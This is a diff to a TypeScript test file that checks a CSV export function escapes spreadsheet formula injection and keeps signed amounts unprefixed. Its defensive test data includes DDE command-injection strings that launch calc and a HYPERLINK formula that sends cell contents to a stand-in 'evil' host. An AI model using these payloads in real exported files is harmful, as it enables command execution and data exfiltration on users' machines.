@@ -105,13 +105,45 @@ describe("reporting utils", () => {
         { formula: "=SUM(A1:A10)", value: 100 },
         { formula: "@SUM(A1)", value: 400 },
         { formula: "|MACRO", value: 500 },
+        { formula: "+CMD|' /C calc'!A0", value: 600 },
+        { formula: "-2+3+cmd|' /C calc'!A0", value: 700 },
+        { formula: "\tSUM(A1)", value: 800 },
       ];
       const headers: CsvHeader<TestFormulaData>[] = [
         { id: "formula", label: "formula" },
         { id: "value", label: "value" },
       ];
       const expected =
-        "formula,value\n'=SUM(A1:A10),100\n'@SUM(A1),400\n'|MACRO,500";
+        "formula,value\n'=SUM(A1:A10),100\n'@SUM(A1),400\n'|MACRO,500\n'+CMD|' /C calc'!A0,600\n'-2+3+cmd|' /C calc'!A0,700\n'\tSUM(A1),800";
+      expect(convertToCsv({ data, headers })).toBe(expected);
+    });
+
+    it("should keep signed amounts unprefixed", () => {
+      const data: TestFormulaData[] = [
+        { formula: "+1.00", value: 100 },
+        { formula: "-1.0001", value: 200 },
+        { formula: "-1'234.56789012", value: 300 },
+        { formula: "+0.00000001", value: 400 },
+      ];
+      const headers: CsvHeader<TestFormulaData>[] = [
+        { id: "formula", label: "formula" },
+        { id: "value", label: "value" },
+      ];
+      const expected =
+        "formula,value\n+1.00,100\n-1.0001,200\n-1'234.56789012,300\n+0.00000001,400";
+      expect(convertToCsv({ data, headers })).toBe(expected);
+    });
+
+    it("should prefix and quote a hyperlink formula", () => {
+      const data: TestFormulaData[] = [
+        { formula: '+HYPERLINK("https://evil"&A1,"x")', value: 100 },
+      ];
+      const headers: CsvHeader<TestFormulaData>[] = [
+        { id: "formula", label: "formula" },
+        { id: "value", label: "value" },
+      ];
+      const expected =
+        'formula,value\n"\'+HYPERLINK(""https://evil""&A1,""x"")",100';
       expect(convertToCsv({ data, headers })).toBe(expected);
     });
 
@@ -124,7 +156,7 @@ describe("reporting utils", () => {
         { id: "formula", label: "formula" },
         { id: "value", label: "value" },
       ];
-      const expected = 'formula,value\n\'=SUM(A1:A10),100\n"+1234567,12",200';
+      const expected = "formula,value\n'=SUM(A1:A10),100\n\"'+1234567,12\",200";
       expect(convertToCsv({ data, headers })).toBe(expected);
     });
 
